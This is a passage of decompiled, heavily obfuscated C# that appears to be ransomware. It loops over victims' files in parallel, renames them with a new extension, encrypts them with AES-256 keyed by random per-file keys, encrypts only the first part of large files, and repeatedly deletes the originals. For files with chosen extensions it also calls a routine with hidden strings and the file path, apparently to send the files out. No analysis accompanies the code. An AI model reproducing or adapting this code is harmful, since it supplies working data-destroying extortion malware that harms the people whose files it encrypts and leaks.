								thread2.Start();
							}
							string text4 = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
							string s4 = iAHfzSnUkutzj.JugqgFJafiYWrN(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (cnqbTCccgr == zCsmcvfctIQqb.getString_0(107396772))
							{
								byte[] array2 = null;
								byte[] byte_2 = nCuLeFOJMwFm.SDNAkiJfsilGu(CS_0024_003C_003E8__locals0.mCkadvSFOV, Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024);
								if (nCuLeFOJMwFm.qPbWhlKhAppzNfg(iDrQCKghbyOmD: (!uXImrDqeGgUMuqj) ? (mAogUeKgKjciiQM ? nCuLeFOJMwFm.lGkbxBLhmdAR(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nCuLeFOJMwFm.lGkbxBLhmdAR(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mAogUeKgKjciiQM ? TWzuRmGwXZJuI.RWjIeFSWaBx(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TWzuRmGwXZJuI.RWjIeFSWaBx(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), pKaaTBGJXvm: CS_0024_003C_003E8__locals0.mCkadvSFOV, zLzjQSIBEPplj: bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!mAogUeKgKjciiQM)
							{
								if (RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.mCkadvSFOV, yYEzOFFalxHtfd, CS_0024_003C_003E8__locals0.iQTIcymIJnskgc))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.mCkadvSFOV, yYEzOFFalxHtfd, text4, bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09e1;
						}
					}
					continue;
					IL_09e1:
					CS_0024_003C_003E8__locals0.jFEDMGNYImhkubB.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.jFEDMGNYImhkubB, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new zCsmcvfctIQqb.JvVYRRIESgJ();
			CS_0024_003C_003E8__locals0.MPyxrgXdswzEa = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn = string_0;
			if (CS_0024_003C_003E8__locals0.fWMKriILxpnJx.Length != 0)
			{
				string[] fWMKriILxpnJx = CS_0024_003C_003E8__locals0.fWMKriILxpnJx;
				int num = 0;
				while (num < fWMKriILxpnJx.Length)
				{
					string value = fWMKriILxpnJx[num];
					if (!CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.EndsWith(CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!twsigDVIjwu.Contains(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn))
			{
				if (ZvCBEZNGHm == zCsmcvfctIQqb.getString_0(107396919))
				{
					try
					{
						if (TyZKNgMENwJFJ.XaMCZRYeWeP(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn))
						{
							TyZKNgMENwJFJ.KajMhyCQYhazwSI(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
						}
					}
					catch
					{
					}
				}
				twsigDVIjwu.Add(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
				if (!kYHVChgvsRpLIPK.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn)))
				{
					kYHVChgvsRpLIPK.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn));
				}
				InoKNxbMnPL(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
				try
				{
					new qgJBARYOVEIp().GiGCbTRccdaXtRKR(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (AuaquqZBglw)
							{
								Console.WriteLine(zCsmcvfctIQqb.getString_0(107365833) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107365820) + new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length + zCsmcvfctIQqb.getString_0(107365767));
								Console.WriteLine(zCsmcvfctIQqb.getString_0(107365758));
							}
						}
						catch
						{
						}
						hdbKundeWzS(PezUDwzFibxi(zCsmcvfctIQqb.getString_0(107365173)), zCsmcvfctIQqb.getString_0(107351431) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107351431) + PezUDwzFibxi(zCsmcvfctIQqb.getString_0(107365148)) + zCsmcvfctIQqb.getString_0(107351431) + Environment.UserName + zCsmcvfctIQqb.getString_0(107351431) + PezUDwzFibxi(zCsmcvfctIQqb.getString_0(107365099)));
					}
				}
				catch (Exception ex2)
				{
					if (xhPAPGRrPiLSI)
					{
						try
						{
							File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107365106) + ex2.Message + zCsmcvfctIQqb.getString_0(107397114));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (xhPAPGRrPiLSI)
						{
							try
							{
								File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107364993) + ex4.Message + zCsmcvfctIQqb.getString_0(107397114));
							}
							catch (Exception)
							{
							}
						}
						nejJdrwjWaKRmO++;
						goto end_IL_031d_2;
					}
					if (vBKqMUxzeIsbM == zCsmcvfctIQqb.getString_0(107396919) && new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length > Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
							{
								if (PAqNnRchDyH)
								{
									CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq = MjsEcDNWxGU + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq;
								}
								File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq);
							}
						}
						catch (Exception ex6)
						{
							if (xhPAPGRrPiLSI)
							{
								try
								{
									File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107365444) + ex6.Message + zCsmcvfctIQqb.getString_0(107397114));
								}
								catch (Exception)
								{
								}
							}
							nejJdrwjWaKRmO++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
						{
							CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn += CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq;
						}
						if (GmyAlsJsED == zCsmcvfctIQqb.getString_0(107396919))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in GudmyYRjNKBi)
								{
									if (CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.MPyxrgXdswzEa.ENjMrAcnRYQPq) && mIyxJtJKMNcFYRO == zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107396925))
									{
										if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length)
										{
											try
											{
												KmMaNbsldEJY.uWayiSxqXzMe(zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107352246), zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107352209), zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107352196), CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.ToLower().EndsWith(item3) && mIyxJtJKMNcFYRO == zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107396778))
									{
										try
										{
											KmMaNbsldEJY.uWayiSxqXzMe(zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107352246), zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107352209), zCsmcvfctIQqb.JvVYRRIESgJ.getString_0(107352196), CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
						string s = iAHfzSnUkutzj.JugqgFJafiYWrN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (cnqbTCccgr == zCsmcvfctIQqb.getString_0(107396772))
						{
							byte[] array = null;
							byte[] byte_ = nCuLeFOJMwFm.SDNAkiJfsilGu(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024);
							if (!nCuLeFOJMwFm.qPbWhlKhAppzNfg(iDrQCKghbyOmD: (!uXImrDqeGgUMuqj) ? (mAogUeKgKjciiQM ? nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mAogUeKgKjciiQM ? TWzuRmGwXZJuI.RWjIeFSWaBx(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TWzuRmGwXZJuI.RWjIeFSWaBx(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), pKaaTBGJXvm: CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, zLzjQSIBEPplj: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!mAogUeKgKjciiQM)
						{
							if (!RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, yYEzOFFalxHtfd, CS_0024_003C_003E8__locals0.iQTIcymIJnskgc))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, yYEzOFFalxHtfd, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (PAqNnRchDyH)
						{
							CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq = MjsEcDNWxGU + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq;
						}
						string text2 = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
						string s2 = iAHfzSnUkutzj.JugqgFJafiYWrN(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
						{
							if (!TpjoUwgOYzae)
							{
								if (!mAogUeKgKjciiQM)
								{
									tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, GpMeZoreMAmJ);
								}
								else
								{
									tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!mAogUeKgKjciiQM)
									{
										UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, GpMeZoreMAmJ);
									}
									else
									{
										UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (xhPAPGRrPiLSI)
									{
										try
										{
											File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107349579) + ex11.Message + zCsmcvfctIQqb.getString_0(107397114));
										}
										catch (Exception)
										{
										}
									}
									nejJdrwjWaKRmO++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!TpjoUwgOYzae)
						{
							if (!mAogUeKgKjciiQM)
							{
								tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107349620), GpMeZoreMAmJ);
							}
							else
							{
								tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107349620), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!mAogUeKgKjciiQM)
								{
									UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, GpMeZoreMAmJ);
								}
								else
								{
									UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (xhPAPGRrPiLSI)
								{
									try
									{
										File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + zCsmcvfctIQqb.getString_0(107349579) + ex14.Message + zCsmcvfctIQqb.getString_0(107397114));
									}
									catch (Exception)
									{
									}
								}
								nejJdrwjWaKRmO++;
								return;
							}
						}
						if (mAogUeKgKjciiQM)
						{
							if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
							{
								LDYdJQzZKPd(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, bytes2);
							}
							else
							{
								LDYdJQzZKPd(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			CS_0024_003C_003E8__locals0.jFEDMGNYImhkubB.Remove(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
		});
	}

	private static void lKGuPJSPEvl(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (GmyAlsJsED == getString_0(107396902))
					{
						foreach (string item in GudmyYRjNKBi)
						{
							if (string_0.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396902))
							{
								if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396755))
							{
								try
								{
									KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107349603)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107349603), getString_0(107352622)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void UANUsGuULdAJojl(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (GmyAlsJsED == getString_0(107396902))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in GudmyYRjNKBi)
				{
					if (string_0.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396902))
					{
						if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396755))
					{
						try
						{
							KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = TWzuRmGwXZJuI.RWjIeFSWaBx(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		nYFqJsGRovRB++;
	}

	private static void tBEtVNBoVsVEH(string string_0, string string_1, byte[] byte_0)
	{
		OOgokAXFWUfYJeMi CS_0024_003C_003E8__locals0 = new OOgokAXFWUfYJeMi();
		CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX = string_0;
		CS_0024_003C_003E8__locals0.eJOsLWTydMlX = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string eJOsLWTydMlX = CS_0024_003C_003E8__locals0.eJOsLWTydMlX;
			FileStream fileStream = new FileStream(eJOsLWTydMlX, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (pyThwSTgTjjfN == getString_0(107396902))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.eJOsLWTydMlX.Length > 0)
				{
					if (GmyAlsJsED == getString_0(107396902))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in GudmyYRjNKBi)
						{
							if (CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396902))
							{
								if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396755))
							{
								try
								{
									KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.eJOsLWTydMlX.EndsWith(getString_0(107349603)))
					{
						File.Move(CS_0024_003C_003E8__locals0.eJOsLWTydMlX, CS_0024_003C_003E8__locals0.eJOsLWTydMlX.Replace(getString_0(107349603), getString_0(107352622)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.eJOsLWTydMlX))
							{
								File.Delete(CS_0024_003C_003E8__locals0.eJOsLWTydMlX);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(YnUuGHOKmtC, getString_0(107349352) + CS_0024_003C_003E8__locals0.FEUtJutbYcsNaSAX + getString_0(107349562) + ex2.Message + getString_0(107397097));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> nSFejjdbOLe = NSFejjdbOLe;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				hdbKundeWzS(PezUDwzFibxi(getString_0(107349541)), string_0);
			};
		}
		Parallel.ForEach(nSFejjdbOLe, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> aLqQabkUSs = ALqQabkUSs;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				hdbKundeWzS(PezUDwzFibxi(getString_0(107349496)), string_0);
			};
		}
		Parallel.ForEach(aLqQabkUSs, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (quzMXQQhtrem == getString_0(107396902))
		{
			string[] source = lFlokvUqCTG;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					hdbKundeWzS(PezUDwzFibxi(getString_0(107349496)), getString_0(107349503) + string_0 + getString_0(107349462));
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!VtxukLeuoIqnc().Contains(getString_0(107349218)))
		{
			jjXKaygZnMfv(HyeuKiqpXqV);
		}
		else
		{
			List<string> source2 = iiNbUxIvSmq;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					hdbKundeWzS(PezUDwzFibxi(vfxAFpsOEpfxFmq(getString_0(107349457))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> apMSsmUNniwbaMD = ApMSsmUNniwbaMD;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				hdbKundeWzS(PezUDwzFibxi(getString_0(107349432)), string_0);
			};
		}
		Parallel.ForEach(apMSsmUNniwbaMD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		hdbKundeWzS(PezUDwzFibxi(getString_0(107349541)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		hdbKundeWzS(PezUDwzFibxi(getString_0(107349496)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		hdbKundeWzS(PezUDwzFibxi(getString_0(107349496)), getString_0(107349503) + string_0 + getString_0(107349462));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		hdbKundeWzS(PezUDwzFibxi(vfxAFpsOEpfxFmq(getString_0(107349457))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		hdbKundeWzS(PezUDwzFibxi(getString_0(107349432)), string_0);
	}

